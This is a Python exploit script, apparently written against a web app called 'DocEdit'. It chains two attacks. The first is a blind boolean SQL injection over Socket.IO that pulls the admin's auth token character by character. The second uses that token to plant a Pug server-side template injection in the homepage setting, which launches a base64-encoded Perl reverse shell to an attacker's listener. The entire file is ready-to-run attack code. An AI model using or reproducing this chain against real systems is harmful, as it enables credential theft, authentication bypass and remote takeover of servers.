#!/usr/bin/env python3

import socketio
import sys
import time
import argparse
import base64
import requests

prefix = (str(int(time.time())))[7:]
USERNAME = f"johndoe{prefix}"
EMAIL = f"{USERNAME}@acme.ltd"
PASSWORD = "Password!1234"

sio = socketio.Client()
ready = False
injection = "asf' OR (select ascii(substring(([QUERY]),[DIGIT],1)) = [CHAR])#"
johnDoeToken = ""
length = ""
query = ""
char = ""
AdminToken = ""
foundChar = False
done = False

@sio.on('emailFound')
def on_message(data):
    global ready, char, AdminToken, foundChar
    if data:
        foundChar = True
        extracted_char = chr(char)
        AdminToken += extracted_char
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    ready = True

registering = False

@sio.on("message")
def on_message_event(data):
    global registering
    if not registering:
        return  # Ignore messages when not registering

    if isinstance(data, dict) and "message" in data:
        if data["message"] == "Your user was registered.":
            print("[+] User Registered Successfully")
        else:
            print(f"[-] Failed to register the user: {data['message']}")
    else:
        print("[-] Unexpected registration response:", data)
    registering = False

@sio.on("user")
def on_user_event(data):
    global johnDoeToken
    if isinstance(data, dict) and "token" in data:
        johnDoeToken = data["token"]
        print(f"[+] Login successful. John Doe's token: {johnDoeToken}")
    else:
        print("[-] Unexpected login response:", data)

@sio.event
def connect():
    try:
        CreateAccount()
        time.sleep(3)
    except Exception as e:
        print("[-] Error creating account:", e)
    try:
        Login()
        time.sleep(2)
    except Exception as e:
        print("[-] Error logging in:", e)
    try:
        print("[+] Starting SQLi")
        startLoop()
    except KeyboardInterrupt:
        print("[-] ctrl + c pressed, exiting...")

@sio.event
def connect_error(err):
    print(f"[-] The connection failed! Error: {err}")

@sio.event
def disconnect():
    print("[-] Disconnected from server")

def CreateAccount():
    global registering
    registering = True
    sio.emit("postRegister", {"firstName": "John","lastName":"Doe","email":EMAIL,"password1":PASSWORD,"password2":PASSWORD})
    print(f"[+] Account {EMAIL}:{PASSWORD} has been successfully created.")

def Login():
    print("[*] Logging you in...")
    sio.emit("postLogin", {"email":EMAIL, "password":PASSWORD})

def startLoop():
    global foundChar, ready, char, done
    for x in range(1, int(length) + 1):
        for y in range(32, 127):
            if foundChar:
                foundChar = False
                break
            ready = False
            char = y
            payload = injection.replace("[QUERY]", query).replace("[DIGIT]", str(x)).replace("[CHAR]", str(y))
            sio.emit('checkEmail', {"token": johnDoeToken, "email": payload})
            sys.stdout.write(chr(y))
            sys.stdout.write("\b")
            sys.stdout.flush()
            while not ready:
                time.sleep(0.01)
    if len(AdminToken) == int(length):
        print()
        print(f"[+] Admin's token: {AdminToken}")
        done = True
    else:
        print("[-] SQLi Failed!")
    sio.disconnect()

def exfilAdminToken(target_ip, normalUserToken): 
    global query, length, johnDoeToken 
    length = "32" # 33 in real 
    query = "select token from AuthTokens where UserId=1" # SQL query to be executed on the target machine 
    johnDoeToken = normalUserToken 
    targetUrl = f"http://{target_ip}" 
    # Adjust socketio_path and transports if the server requires it 
    sio.connect(targetUrl, socketio_path="/socket.io", transports=["websocket"]) 
    while not done: 
        time.sleep(0.01) 
    return AdminToken

def rce(target_ip, lhost, lport):
    global AdminToken
    if not AdminToken:
        raise RuntimeError("[-] No admin token available for template update.")

    # use a fresh client to avoid engineio state issues
    r_sio = socketio.Client()
    r_sio.connect(f"http://{target_ip}", socketio_path="/socket.io", transports=["websocket"])

    payload = f"""use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};"""
    payload_bytes = payload.encode('ascii')
    base64_bytes = base64.b64encode(payload_bytes)
    base64_string = base64_bytes.decode('ascii')

    revShell_homepage_payload = """h1= title\r\np Welcome to #{title}\r\n\r\n#{spawn_sync = this.process.binding('spawn_sync')}\r\n#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}}\r\n#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}}\r\n#{payload='%s'}\r\n#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}""" % (base64_string)
    print("[+] SSTI Palyoad: ", revShell_homepage_payload)

    r_sio.emit("updateSettings",{"homePage": revShell_homepage_payload,"token": AdminToken})

    print("[+] Template edited")
    print("[*] Rendering the tamplate...")
    time.sleep(2)
    r_sio.emit("getServer",{"token":f"{AdminToken}"})
    time.sleep(2)
    requests.get(f"http://{target_ip}/")
    print("[+] Template rendering request sent successfully. Check your listener.")
    print(f"[+] Listener {lhost}:{lport}")
    r_sio.disconnect()

def main():
    parser = argparse.ArgumentParser(description="DocEdit SQLi Authentication Bypass Script & Pug NodeJs SSTI RCE")
    parser.add_argument("target", help="target's IP address (e.g, 192.168.174.237)")
    parser.add_argument("lhost", help="listener's IP address (e.g, 192.168.45.203)")
    parser.add_argument("lport", help="listener port")
    args = parser.parse_args()

    successfulTokenExfiltration = exfilAdminToken(args.target, johnDoeToken)
    if not successfulTokenExfiltration:
        print("[!] Failed to exfiltrate admin token. Aborting.")
    else:
        rce(args.target, args.lhost, args.lport)
        time.sleep(5)

if __name__ == "__main__":
    main()
